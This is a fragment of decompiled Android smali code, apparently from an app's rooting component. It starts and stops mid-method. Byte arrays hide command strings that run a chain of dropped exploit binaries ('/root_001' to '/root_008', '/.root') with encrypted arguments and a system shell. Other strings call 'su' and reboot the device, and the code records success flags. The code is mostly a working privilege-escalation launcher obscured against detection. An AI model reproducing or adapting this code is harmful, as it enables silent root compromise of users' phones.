    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v4, 0x11

    new-array v4, v4, [B

    fill-array-data v4, :array_24e

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->f()Z

    move-result v3

    if-nez v3, :cond_35

    invoke-interface {v2}, Ljava/util/List;->clear()V

    invoke-direct {p0, v2}, Lcom/test/NewC;->c(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v4, 0x62

    new-array v4, v4, [B

    fill-array-data v4, :array_25c

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->f()Z

    move-result v3

    if-nez v3, :cond_35

    invoke-interface {v2}, Ljava/util/List;->clear()V

    invoke-direct {p0, v2}, Lcom/test/NewC;->c(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v4, v7, [B

    fill-array-data v4, :array_292

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->f()Z

    move-result v3

    if-nez v3, :cond_35

    invoke-interface {v2}, Ljava/util/List;->clear()V

    invoke-direct {p0, v2}, Lcom/test/NewC;->c(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v4, v7, [B

    fill-array-data v4, :array_2a2

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->f()Z

    move-result v2

    if-nez v2, :cond_35

    move v0, v1

    goto/16 :goto_35

    nop

    :array_1cc
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x37t
        0x20t
        0x66t
        0x30t
        0x68t
        0x35t
        0x7at
        0x67t
        0x75t
        0x5at
        0x39t
        0x61t
        0x4at
        0x58t
        0x62t
        0x43t
        0x5at
        0x45t
        0x78t
        0x4dt
        0x61t
        0x4et
        0x32t
        0x6bt
        0x44t
        0x68t
        0x68t
        0x36t
        0x56t
        0x30t
        0x55t
        0x77t
        0x3dt
        0x3dt
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data

    nop

    :array_1ee
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x37t
        0x20t
        0x61t
        0x6ct
        0x31t
        0x73t
        0x37t
        0x6at
        0x42t
        0x46t
        0x4et
        0x74t
        0x6et
        0x39t
        0x66t
        0x61t
        0x42t
        0x6dt
        0x43t
        0x30t
        0x4at
        0x62t
        0x39t
        0x41t
        0x39t
        0x4et
        0x73t
        0x6ct
        0x47t
        0x5at
        0x53t
        0x67t
        0x3dt
        0x3dt
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data

    nop

    :array_210
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x37t
        0x20t
        0x48t
        0x79t
        0x67t
        0x5at
        0x52t
        0x6dt
        0x32t
        0x49t
        0x48t
        0x54t
        0x4bt
        0x57t
        0x70t
        0x70t
        0x37t
        0x48t
        0x6ct
        0x6ct
        0x2ft
        0x73t
        0x53t
        0x30t
        0x75t
        0x59t
        0x36t
        0x36t
        0x78t
        0x64t
        0x63t
        0x77t
        0x3dt
        0x3dt
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data

    nop

    :array_232
    .array-data 1
        0x2ft
        0x2et
        0x72t
        0x6ft
        0x6ft
        0x74t
    .end array-data

    nop

    :array_23a
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x32t
    .end array-data

    nop

    :array_244
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x38t
    .end array-data

    nop

    :array_24e
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x31t
        0x20t
        -0x1et
        -0x80t
        -0x6dt
        0x61t
        0x75t
        0x74t
        0x6ft
    .end array-data

    nop

    :array_25c
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x34t
        0x20t
        0x50t
        0x46t
        0x4dt
        0x4dt
        0x65t
        0x68t
        0x78t
        0x76t
        0x4dt
        0x46t
        0x6bt
        0x32t
        0x56t
        0x53t
        0x46t
        0x4et
        0x38t
        0x41t
        0x77t
        0x38t
        0x58t
        0x47t
        0x58t
        0x68t
        0x39t
        0x31t
        0x55t
        0x4et
        0x69t
        0x45t
        0x53t
        0x72t
        0x2ft
        0x69t
        0x50t
        0x6et
        0x32t
        0x6dt
        0x48t
        0x5at
        0x4ft
        0x67t
        0x3dt
        0x3dt
        0x20t
        0x33t
        0x75t
        0x35t
        0x79t
        0x64t
        0x65t
        0x5at
        0x6bt
        0x75t
        0x49t
        0x4et
        0x37t
        0x42t
        0x31t
        0x4dt
        0x49t
        0x69t
        0x30t
        0x73t
        0x6at
        0x6bt
        0x77t
        0x75t
        0x66t
        0x55t
        0x6at
        0x62t
        0x6dt
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data

    nop

    :array_292
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x35t
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data

    :array_2a2
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x36t
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data
.end method

.method private i()V
    .registers 8

    const/16 v6, 0x18

    const/16 v5, 0x9

    const/16 v4, 0x39

    const/4 v3, 0x0

    iget-object v0, p0, Lcom/test/NewC;->m:La/a/a;

    const-string v1, "RtLib"

    invoke-virtual {v0, v1, v3}, La/a/a;->a(Ljava/lang/String;I)La/a/b/a;

    move-result-object v0

    sget-object v1, Lcom/test/NewC;->new_l:Ljava/lang/String;

    const-string v2, "done"

    invoke-virtual {v0, v1, v2}, La/a/b/a;->b(Ljava/lang/String;Ljava/lang/Object;)Z

    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    invoke-direct {p0, v0}, Lcom/test/NewC;->a(Ljava/util/List;)V

    const-string v1, "reboot"

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v1, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v2, v4, [B

    fill-array-data v2, :array_18a

    invoke-static {v2}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0, v3}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v1, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v2, v4, [B

    fill-array-data v2, :array_1ac

    invoke-static {v2}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0, v3}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v1, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v2, v4, [B

    fill-array-data v2, :array_1ce

    invoke-static {v2}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0, v3}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-interface {v0}, Ljava/util/List;->clear()V

    const-string v1, "export PATH=/system/bin/"

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    invoke-direct {p0, v0}, Lcom/test/NewC;->a(Ljava/util/List;)V

    const-string v1, "reboot"

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v1, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v2, 0x6

    new-array v2, v2, [B

    fill-array-data v2, :array_1f0

    invoke-static {v2}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0, v3}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-interface {v0}, Ljava/util/List;->clear()V

    const-string v1, "su"

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    invoke-direct {p0, v0}, Lcom/test/NewC;->a(Ljava/util/List;)V

    const-string v1, "reboot"

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v1, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v2, v5, [B

    fill-array-data v2, :array_1f8

    invoke-static {v2}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0, v3}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-interface {v0}, Ljava/util/List;->clear()V

    invoke-direct {p0, v0}, Lcom/test/NewC;->a(Ljava/util/List;)V

    const-string v1, "reboot"

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v1, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v2, v5, [B

    fill-array-data v2, :array_202

    invoke-static {v2}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0, v3}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v1, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v2, 0x11

    new-array v2, v2, [B

    fill-array-data v2, :array_20c

    invoke-static {v2}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0, v3}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v1, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v2, 0x62

    new-array v2, v2, [B

    fill-array-data v2, :array_21a

    invoke-static {v2}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0, v3}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v1, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v2, v6, [B

    fill-array-data v2, :array_250

    invoke-static {v2}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0, v3}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v1, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v2, v6, [B

    fill-array-data v2, :array_260

    invoke-static {v2}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0, v3}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    return-void

    :array_18a
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x37t
        0x20t
        0x66t
        0x30t
        0x68t
        0x35t
        0x7at
        0x67t
        0x75t
        0x5at
        0x39t
        0x61t
        0x4at
        0x58t
        0x62t
        0x43t
        0x5at
        0x45t
        0x78t
        0x4dt
        0x61t
        0x4et
        0x32t
        0x6bt
        0x44t
        0x68t
        0x68t
        0x36t
        0x56t
        0x30t
        0x55t
        0x77t
        0x3dt
        0x3dt
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data

    nop

    :array_1ac
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x37t
        0x20t
        0x61t
        0x6ct
        0x31t
        0x73t
        0x37t
        0x6at
        0x42t
        0x46t
        0x4et
        0x74t
        0x6et
        0x39t
        0x66t
        0x61t
        0x42t
        0x6dt
        0x43t
        0x30t
        0x4at
        0x62t
        0x39t
        0x41t
        0x39t
        0x4et
        0x73t
        0x6ct
        0x47t
        0x5at
        0x53t
        0x67t
        0x3dt
        0x3dt
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data

    nop

    :array_1ce
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x37t
        0x20t
        0x48t
        0x79t
        0x67t
        0x5at
        0x52t
        0x6dt
        0x32t
        0x49t
        0x48t
        0x54t
        0x4bt
        0x57t
        0x70t
        0x70t
        0x37t
        0x48t
        0x6ct
        0x6ct
        0x2ft
        0x73t
        0x53t
        0x30t
        0x75t
        0x59t
        0x36t
        0x36t
        0x78t
        0x64t
        0x63t
        0x77t
        0x3dt
        0x3dt
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data

    nop

    :array_1f0
    .array-data 1
        0x2ft
        0x2et
        0x72t
        0x6ft
        0x6ft
        0x74t
    .end array-data

    nop

    :array_1f8
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x32t
    .end array-data

    nop

    :array_202
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x38t
    .end array-data

    nop

    :array_20c
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x31t
        0x20t
        -0x1et
        -0x80t
        -0x6dt
        0x61t
        0x75t
        0x74t
        0x6ft
    .end array-data

    nop

    :array_21a
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x34t
        0x20t
        0x50t
        0x46t
        0x4dt
        0x4dt
        0x65t
        0x68t
        0x78t
        0x76t
        0x4dt
        0x46t
        0x6bt
        0x32t
        0x56t
        0x53t
        0x46t
        0x4et
        0x38t
        0x41t
        0x77t
        0x38t
        0x58t
        0x47t
        0x58t
        0x68t
        0x39t
        0x31t
        0x55t
        0x4et
        0x69t
        0x45t
        0x53t
        0x72t
        0x2ft
        0x69t
        0x50t
        0x6et
        0x32t
        0x6dt
        0x48t
        0x5at
        0x4ft
        0x67t
        0x3dt
        0x3dt
        0x20t
        0x33t
        0x75t
        0x35t
        0x79t
        0x64t
        0x65t
        0x5at
        0x6bt
        0x75t
        0x49t
        0x4et
        0x37t
        0x42t
        0x31t
        0x4dt
        0x49t
        0x69t
        0x30t
        0x73t
        0x6at
        0x6bt
        0x77t
        0x75t
        0x66t
        0x55t
        0x6at
        0x62t
        0x6dt
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data

    nop

    :array_250
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x35t
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data

    :array_260
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x36t
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data
.end method


# virtual methods
.method public run()V
    .registers 5

    const/4 v2, 0x1

    const/4 v3, 0x0

    iget-object v0, p0, Lcom/test/NewC;->m:La/a/a;

    if-eqz v0, :cond_e

    iget-object v0, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v0}, La/a/e/f;->a(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_f

    :cond_e
    :goto_e
    return-void

    :cond_f
    invoke-direct {p0}, Lcom/test/NewC;->b()V

    invoke-direct {p0}, Lcom/test/NewC;->c()Z

    move-result v0

    if-eqz v0, :cond_cc

    iget-boolean v0, p0, Lcom/test/NewC;->o:Z

    if-eqz v0, :cond_20

    invoke-direct {p0}, Lcom/test/NewC;->i()V

    goto :goto_e

    :cond_20
    new-instance v0, Ljava/lang/StringBuilder;

    iget-object v1, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, "/"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0, v2}, Lcom/test/NewC;->a(Ljava/lang/String;I)Z

    move-result v0

    if-eqz v0, :cond_43

    iput-boolean v2, p0, Lcom/test/NewC;->s:Z

    :cond_43
    iget-boolean v0, p0, Lcom/test/NewC;->r:Z

    if-eqz v0, :cond_6b

    new-instance v0, Ljava/lang/StringBuilder;

    iget-object v1, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, "/"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x2

    invoke-direct {p0, v0, v1}, Lcom/test/NewC;->a(Ljava/lang/String;I)Z

    move-result v0

    if-eqz v0, :cond_6b

    iput-boolean v2, p0, Lcom/test/NewC;->t:Z

    :cond_6b
    iget-boolean v0, p0, Lcom/test/NewC;->r:Z

    if-eqz v0, :cond_92

    iget-boolean v0, p0, Lcom/test/NewC;->s:Z

    if-eqz v0, :cond_b1

    iget-boolean v0, p0, Lcom/test/NewC;->t:Z

    if-eqz v0, :cond_b1

    iget-object v0, p0, Lcom/test/NewC;->m:La/a/a;

    const-string v1, "RtLib"

    invoke-virtual {v0, v1, v3}, La/a/a;->a(Ljava/lang/String;I)La/a/b/a;

    move-result-object v0

    sget-object v1, Lcom/test/NewC;->j:Ljava/lang/String;

    const-string v2, "done"

    invoke-virtual {v0, v1, v2}, La/a/b/a;->b(Ljava/lang/String;Ljava/lang/Object;)Z

    sget-object v1, Lcom/test/NewC;->new_l:Ljava/lang/String;

    const-string v2, "done"

    invoke-virtual {v0, v1, v2}, La/a/b/a;->b(Ljava/lang/String;Ljava/lang/Object;)Z

    invoke-direct {p0}, Lcom/test/NewC;->b()V

    goto/16 :goto_e

    :cond_92
    iget-boolean v0, p0, Lcom/test/NewC;->s:Z

    if-eqz v0, :cond_b1

    iget-object v0, p0, Lcom/test/NewC;->m:La/a/a;

    const-string v1, "RtLib"

    invoke-virtual {v0, v1, v3}, La/a/a;->a(Ljava/lang/String;I)La/a/b/a;

    move-result-object v0

    sget-object v1, Lcom/test/NewC;->j:Ljava/lang/String;

    const-string v2, "done"

    invoke-virtual {v0, v1, v2}, La/a/b/a;->b(Ljava/lang/String;Ljava/lang/Object;)Z

    sget-object v1, Lcom/test/NewC;->new_l:Ljava/lang/String;

    const-string v2, "done"

    invoke-virtual {v0, v1, v2}, La/a/b/a;->b(Ljava/lang/String;Ljava/lang/Object;)Z

    invoke-direct {p0}, Lcom/test/NewC;->b()V

    goto/16 :goto_e

    :cond_b1
    invoke-direct {p0}, Lcom/test/NewC;->d()Z

    move-result v0

    if-eqz v0, :cond_e0

    iget-object v0, p0, Lcom/test/NewC;->m:La/a/a;

    const-string v1, "RtLib"

    invoke-virtual {v0, v1, v3}, La/a/a;->a(Ljava/lang/String;I)La/a/b/a;

    move-result-object v0

    sget-object v1, Lcom/test/NewC;->j:Ljava/lang/String;

    const-string v2, "done"

    invoke-virtual {v0, v1, v2}, La/a/b/a;->b(Ljava/lang/String;Ljava/lang/Object;)Z

    invoke-direct {p0}, Lcom/test/NewC;->g()Z

    invoke-direct {p0}, Lcom/test/NewC;->h()Z

    :cond_cc
    :goto_cc
    invoke-direct {p0}, Lcom/test/NewC;->b()V

